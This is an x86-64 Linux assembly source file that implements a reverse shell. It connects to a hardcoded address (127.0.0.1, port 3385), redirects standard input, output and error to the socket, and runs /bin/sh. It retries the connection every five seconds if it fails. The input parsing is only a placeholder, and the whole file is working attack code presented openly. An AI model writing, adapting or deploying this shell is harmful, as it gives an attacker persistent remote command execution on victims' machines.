BITS 64

%define SYS_SOCKET     41
%define SYS_CONNECT    42
%define SYS_DUP2       33
%define SYS_EXECVE     59
%define SYS_NANOSLEEP  35
%define SYS_READ       0
%define AF_INET        2
%define SOCK_STREAM    1

section .bss
ip_port_buf resb 32          ; here "127.0.0.1:3385"
ip_bin      resd 1
port_bin    resw 1

section .data
sockaddr:
    dw AF_INET
    dw 0                    ; placeholder for port_bin
    dd 0                    ; placeholder for ip_bin
    dq 0

timespec:
    dq 5
    dq 0

shell_path db "/bin/sh", 0
arg1 db "sh", 0
arg2 db "-c", 0
shell_cmd db "echo '\033]10;#D1007F\007\033]11;#FFD1DC\007'; exec /bin/sh", 0
argv dq arg1, arg2, shell_cmd, 0

; === ENVIRONMENT VARIABLES ===
env_path db "PATH=/usr/bin:/bin", 0
env_home db "HOME=/root", 0
env dq env_path, env_home, 0   ; table terminée par NULL

section .text
global _start

_start:
; --------------------------------------------------------
; read(0, ip_port_buf, 32) -> get IP:PORT from stdin
; --------------------------------------------------------
    mov     rax, SYS_READ
    xor     rdi, rdi              ; fd = 0 (stdin)
    lea     rsi, [rel ip_port_buf]
    mov     rdx, 32
    syscall

; --------------------------------------------------------
; parse IP and PORT from buffer (placeholder parsing)
; hardcoded fallback: IP = 127.0.0.1, PORT = 3385 (0x390D)
; --------------------------------------------------------
    mov     dword [rel sockaddr+4], 0x0100007F    ; 127.0.0.1
    mov     word  [rel sockaddr+2], 0x390D        ; port 3385

.retry_connect:
; --------------------------------------------------------
; socket(AF_INET, SOCK_STREAM, 0)
; returns sockfd in rax
; --------------------------------------------------------
    mov     rax, SYS_SOCKET
    mov     rdi, AF_INET
    mov     rsi, SOCK_STREAM
    xor     rdx, rdx
    syscall
    test    rax, rax
    js      .retry_wait       ; if error, stop and retry
    mov     r12, rax          ; save sockfd

; --------------------------------------------------------
; connect(sockfd, &sockaddr, 16)
; tries to connect to remote address
; --------------------------------------------------------
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    mov     rax, SYS_CONNECT
    syscall
    test    rax, rax
    js      .retry_wait       ; if error,stop and retry

; --------------------------------------------------------
; dup2(sockfd, 0), 1, 2 -> redirect stdin/out/err to socket
; --------------------------------------------------------
    mov     rsi, 0
.dup_loop:
    mov     rax, SYS_DUP2
    mov     rdi, r12
    mov     rdx, rsi
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

; --------------------------------------------------------
; execve("/bin/sh", ["sh", "-c", shell_cmd], [env])
; runs interactive shell with themed colors and env vars
; --------------------------------------------------------
    mov     rax, SYS_EXECVE
    lea     rdi, [rel shell_path]
    lea     rsi, [rel argv]
    lea     rdx, [rel env]      
    syscall

.retry_wait:
; --------------------------------------------------------
; nanosleep({5, 0}, NULL)
; wait 5 seconds before retrying
; --------------------------------------------------------
    mov     rax, SYS_NANOSLEEP
    lea     rdi, [rel timespec]
    xor     rsi, rsi
    syscall
    jmp     .retry_connect
